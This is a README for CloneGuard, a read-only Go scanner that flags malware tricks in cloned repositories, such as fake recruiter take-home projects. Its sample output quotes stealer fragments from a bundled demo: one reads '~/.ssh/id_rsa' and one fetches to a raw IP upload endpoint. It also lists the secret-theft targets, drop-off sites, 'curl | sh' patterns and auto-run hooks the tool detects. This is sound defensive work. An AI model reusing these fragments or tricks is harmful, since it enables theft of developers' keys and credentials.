# CloneGuard

Scan a project for malware tricks **before** you run it. Built after a fake-recruiter
"demo app" tried to steal SSH and AWS keys.

cloneguard is a small, dependency-free Go command-line tool. It only reads files. It
never runs, installs, or imports anything from the project it scans.

## Why this exists

A common attack goes like this: someone posing as a recruiter sends you a "take-home
assignment" or "demo app". You clone it, run `npm install` or open it in your editor,
and it quietly uploads your SSH keys, cloud credentials, browser passwords or crypto
wallets. Often the trigger isn't the app itself but an install hook or an editor task
that runs the moment you open the folder.

cloneguard is a quick first look that catches the usual tricks, so you can decide
whether the project is safe to touch.

## Build

Requires Go 1.24+. There are no third-party dependencies.

    go build -o cloneguard ./cmd/cloneguard

Optionally put the binary on your PATH, for example `mv cloneguard /usr/local/bin/`.

## Usage

    cloneguard clone https://github.com/someone/demo-app   # clone, then scan right away
    cloneguard scan ./some-folder                          # scan an existing folder
    cloneguard scan                                        # scan the current folder
    cloneguard ./some-folder                               # shorthand for scan
    cloneguard scan --json ./some-folder                   # machine-readable output

`clone` runs `git clone` (which downloads files but does not execute project code) into
a folder named after the repo, or into `[dir]` if you give one, then scans it.

Other commands: `cloneguard help`, `cloneguard version`.

### Flags

Flags go **before** the path.

| Flag | Meaning |
|------|---------|
| `--json` | Print results as JSON instead of text |
| `--include-deps` | Also scan `node_modules` (slow; skipped by default) |
| `--max-size-mb N` | Skip files larger than N MB (default 2) |
| `--no-color` | Plain output. Also honored: the `NO_COLOR` env var and `TERM=dumb` |

### Exit codes

| Code | Verdict | Meaning |
|------|---------|---------|
| 0 | clean | No red flags found |
| 1 | caution | Only medium-severity findings |
| 2 | suspicious | At least one high-severity finding |
| 3 | dangerous | At least one critical finding |
| 10 | error | Bad usage, unreadable path, or `git clone` failed |

This makes it easy to use in scripts or a git hook, e.g.
`cloneguard scan . || exit 1`.

## Example

Scanning the bundled `demo/` folder, which contains a fake stealer and an auto-run
VS Code task:

    $ cloneguard scan --no-color demo

     DANGEROUS  Do not run or install anything from this project.
    1 critical, 2 high, 1 medium, 0 low

    [CRITICAL] util.js:1  Reaches for your secrets AND talks to a suspicious server
    [HIGH] .vscode/tasks.json:1  Runs a command the moment you open the folder
    [HIGH] util.js:1  Touches your SSH keys
        > readFile("~/.ssh/id_rsa");
    [MEDIUM] util.js:2  Connects to a raw IP address
        > fetch("http://203.0.113.7:8080/upload");

Each finding shows the file and line, the offending snippet, and a plain-English
explanation of why it matters. (Output above is abbreviated.)

### JSON output

With `--json` the result has this shape:

    {
      "root": "demo",
      "files_scanned": 2,
      "files_skipped": 0,
      "findings": [
        { "rule": "reads-ssh-keys", "title": "Touches your SSH keys",
          "severity": "high", "file": "util.js", "line": 1,
          "snippet": "...", "why": "..." }
      ],
      "verdict": "dangerous"
    }

## What it looks for

- **Secret theft:** code that reaches for SSH keys, cloud credentials (AWS, GCP,
  Azure, Kubernetes, Docker, npm, Git), shell history, browser passwords, wallets, or
  dumps all environment variables
- **Suspicious network use:** connections to raw IPs, webhook/paste/request-catcher
  drop-off sites (Discord webhooks, Telegram bots, pastebin, webhook.site, ...), public
  tunnel services, or base64-hidden URLs
- **Download-and-run:** code that downloads or decodes text and then executes it
  (`eval`, `new Function`, `curl | sh`)
- **Auto-run hooks:** npm install scripts, `.vscode/tasks.json` tasks that run when the
  folder is opened, risky `setup.py`
- **Obfuscation:** scrambled code such as `_0x` identifiers, hex escapes, or code hidden
  behind long runs of whitespace
- **Compiled binaries** (`.exe`, `.dll`, `.so`, `.dylib`, `.node`, ...) checked into the repo
- **Dangerous combinations in one file**, such as reading keys AND talking to a
  suspicious server, which is escalated to critical

## How it works

1. Walks the folder, skipping `.git`, `node_modules`, `__pycache__`, `.venv` and `venv`
   (unless `--include-deps`), plus files over the size limit.
2. Classifies each file as code, config, docs, lockfile or binary, and applies only the
   rules that make sense for that kind (docs and lockfiles are ignored for text rules).
3. Runs line-by-line regex rules and per-file checks (for example parsing
   `package.json` for install hooks).
4. Combines findings: if one file has hits from multiple risky categories
   (credentials, network, dynamic execution, obfuscation), it raises a combined finding.
5. Picks a verdict from the worst severity found (see exit codes above).

## Limits

"No red flags found" is not proof of safety. It only means none of these common
tricks were spotted. cloneguard is pattern-based, so determined attackers can evade it,
and it can produce false positives on legitimate code (a password manager *should*
touch browser data). For code from strangers, still use a throwaway VM or container.

## Develop

    go test ./...

Layout:

- `cmd/cloneguard/main.go`: CLI, flags and `clone` handling
- `internal/scanner/rules.go`: line-level detection rules (ID, severity, regex, explanation)
- `internal/scanner/filechecks.go`: per-file checks (package.json hooks, tasks.json, setup.py, binaries)
- `internal/scanner/scanner.go`: directory walk, file classification, verdict logic
- `internal/report/report.go`: human-readable text output
- `demo/`: a deliberately malicious sample for trying the tool

To add a detection, append a rule to `lineRules` in `rules.go` with an `id`, `title`,
severity, category, scope, regex and a plain-English `why`, then add a test in
`internal/scanner/scanner_test.go`.

## License

MIT. See [LICENSE](LICENSE).
